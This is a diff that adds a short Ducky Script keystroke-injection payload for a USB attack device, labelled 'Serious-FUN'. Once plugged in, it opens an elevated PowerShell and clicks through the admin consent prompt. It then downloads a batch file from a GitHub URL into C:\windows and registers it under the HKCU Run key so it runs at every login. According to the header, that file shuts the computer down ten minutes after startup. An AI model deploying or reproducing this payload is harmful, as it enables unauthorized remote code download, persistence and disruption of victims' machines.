@@ -1,0 +1,25 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Creates a batch file that will run on startup and shutdown the pc after 10 minutes 
+REM Version:	1.0
+REM Category:	Serious-FUN
+DELAY 750
+WINDOWS d
+DELAY 950
+WINDOWS r
+DELAY 650
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 850
+ALT y
+DELAY 1200
+STRING $url = "https://github.com/UNC0V3R3D/ressources/blob/main/shutdown.bat"; $output = "C:\windows\927356239523.bat"; Invoke-WebRequest -Uri $url -OutFile $output; 
+DELAY 400
+ENTER
+DELAY 600
+STRING New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" ` -Name "927356239523" ` -Value "C:\windows\927356239523.bat"
+DELAY 400
+ENTER
+exit
